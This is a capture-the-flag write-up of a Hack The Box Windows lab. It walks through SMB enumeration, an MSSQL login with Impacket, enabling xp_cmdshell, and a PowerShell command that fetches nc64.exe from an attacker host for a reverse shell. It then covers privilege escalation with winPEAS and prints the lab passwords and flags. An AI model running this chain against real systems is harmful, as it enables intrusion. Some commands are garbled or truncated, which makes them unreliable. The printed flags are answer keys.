# README

## Starting Point

* Start the machine by downloading the OpenVPN file provided by HTB.

```bash
#sudo openvpn <filename.ovpn>
```

{% stepper %}
{% step %}
### Task 1

**Question:** Which TCP port is hosting a database server?

**Answer:** 1433

* TTL OS Identification
* Nmap Scan
* NSE
{% endstep %}

{% step %}
### Task 2

**Question:** What is the name of the non-Administrative share available over SMB?

**Answer:** backups

* SMB Enumeration using `smbclient`
{% endstep %}

{% step %}
### Task 3

**Question:** What is the password identified in the file on the SMB share?

**Answer:** M3g4c0rp123

* SMB Enumeration
* Got the SQL credentials using impacket to login and getting the initially access.
{% endstep %}

{% step %}
### Task 4

**Question:** What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

**Answer:** `mssqlclient.py`

* Get the initials access using IMPACKET SQL Client
* Enumeration of MYSQL using IMPACKET SQL CLIENT.
  * `enum_DB`, `enum_users`, `enum_owner`
{% endstep %}

{% step %}
### Task 5

**Question:** What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**Answer:** `xp_cmdshell`

* Enumerating users in SQL
  * The `xp_cmdshell` system stored procedure in SQL Server allows users to execute Windows shell commands from the SQL Server environment.

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Refers: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

* The response is in number 1 means TRUE and 0 means FALSE.
* The `xp_cmdshell` is working which is 1 because I enable it from start using `#enable_xp_cmdshell`

```sql
EXEC xp_cmdshell 'whoami';
```

```sql
SELECT IS_SRVOLEMEBER('sysadmin');
```

* Executing `cmd.exe` cammands in powershell using `-c` flags.

Getting the initially Access

* Host an HTTP service using python to upload/download the reverse shell.

```bash
#sudo pyhton3 -m http.server 80/8888
```

* Listen on Netcat random port to get the reverse shell.
* Links for NC
  * https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post\_page-----a2ddc3557403
* Downloaded the `nc.exe` above link in attacker local machine.
* Getting the `nc.exe` into the victim machine using the hosts http python server.
* Got the users name from above task 4
* `;` means `&&`
* `-c` tells PowerShell to execute commands in `cmd.exe`

```bash
#xp_cmdshell "powershell" -c cd /Users/sql_svc/Downloads ; wget http://attacker-IP-Address/nc64.exe -outfile nc64.exe
```

* Go to the `/Users/sql_svc/Downloads` directory and execute the `nc64.exe` that will reverse shell into the nc which the attacker is listing.
* `;` means `&&`
* Port 443 and 53 are the common ports which is allowed in firewall or its not blocked by L3 Security Device in network.

```bash
#xp_cmdshell "powershell -c cd/Users/sql_svc/Downloads ; "
```

Listing on port 53

* Got the initials access.

Port 443

Port 53
{% endstep %}

{% step %}
### Task 6

**Question:** What script can be used in order to search possible paths to escalate privileges on Windows hosts?

**Answer:** winpeas

Privileged Escalation

* Try downloading online from GitHub. WinPEAS but it seems the victim machine doesn't have internet.
* Download it locally on the attacker machine and upload it via Python HTTP service.
  * Links: https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
* Downloading winPEAS from the attacker machine via HTTP Service.

```bash
#wget http://attacker-ip-address/winPEASx64.exe
```

Executed:

```bash
#./winPEASx64.exe
```
{% endstep %}

{% step %}
### Task 7

**Question:** What file contains the administrator's password?

**Answer:** `ConsoleHost_history.txt`

* WinPEAS found the directory which has `ConsoleHost_history.txt` file which has the administrator password.
* `ConsoleHost_history.txt` is a text file that stores the history of recent Windows PowerShell commands.
* Which means someone has recently changed the administrator password which is stored in the history file.

```
Administrator : MEGACORP_4dm1n!!
```

### Submit user flag

**Answer:** `3e7b102e78218e935bf3f4951fec21a3`

* Flag 1 from the initial access

### Submit root flag

**Answer:** `b91ccec3305e98240082d4474b848528`

* Getting access using psexec impacket.

Administrator: `MEGACORP_4dm1n!!`
{% endstep %}
{% endstepper %}
